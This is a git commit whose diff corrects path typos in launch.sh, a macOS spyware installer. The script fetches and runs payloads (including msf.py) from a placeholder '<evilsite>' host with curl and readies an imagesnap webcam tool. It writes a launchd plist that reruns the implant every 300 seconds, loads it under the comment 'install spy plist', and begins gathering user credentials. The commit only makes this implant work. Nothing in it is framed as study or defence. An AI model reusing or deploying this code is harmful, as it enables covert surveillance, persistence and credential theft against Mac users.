8cf650c17d7f0af0b70e9e6ee134d2de7a29fc42
Steve Coward <steve.coward@gmail.com>
2016-06-30 20:01:43 -0400

    fixes small typos in launch script

--- launch.sh
+++ launch.sh
@@ -13,30 +13,28 @@ curl -s -o /Users/$USERNAME/.dtc2/msf.py http://<evilsite>/msf.py
 chmod +x /Users/$USERNAME/.dtc2/dtc2.sh
 chmod +x /Users/$USERNAME/.dtc2/imagesnap
 /usr/bin/python /Users/$USERNAME/.dtc2/msf.py
-curl -s -o /Users/$USERNAME/.dtc2.dtc2.sh http://<evilsite>.dtc2.sh
-chmox +x /Users/$USERNAME/.dtc2.dtc2.sh
-/bin/sh /Users/$USERNAME/.dtc2.dtc2.sh
+/bin/sh /Users/$USERNAME/.dtc2/dtc2.sh
 
 # create plist
 
-echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http:///www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "<plist version=\"1.0\">" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "<dict>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    <key>Label</key>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    <string>net.dtc2</string>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    <key>ProgramArguments</key>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    <array>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "        <string>/Users/$USERNAME/.dtc2/dtc2.sh</string>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    </array>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    <key>StartInterval</key>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "    <integer>300</integer>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "</dict>" >> /Users/$USERNAME/.dtc2.dtc2.plist
-echo "</plist>" >> /Users/$USERNAME/.dtc2.dtc2.plist
+echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http:///www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "<plist version=\"1.0\">" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "<dict>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    <key>Label</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    <string>net.dtc2</string>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    <key>ProgramArguments</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    <array>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "        <string>/Users/$USERNAME/.dtc2/dtc2.sh</string>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    </array>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    <key>StartInterval</key>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "    <integer>300</integer>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "</dict>" >> /Users/$USERNAME/.dtc2/dtc2.plist
+echo "</plist>" >> /Users/$USERNAME/.dtc2/dtc2.plist
 
 # install spy plist plist
-launchctl load /Users/$USERNAME/.dtc2.dtc2.plist
-launchctl start /Users/$USERNAME/.dtc2.dtc2.plist
+launchctl load /Users/$USERNAME/.dtc2/dtc2.plist
+launchctl start /Users/$USERNAME/.dtc2/dtc2.plist
 
 # ask the user nicely for creds
 echo $USERNAME > /Users/$USERNAME/.dtc2/$HOSTNAME-creds.txt
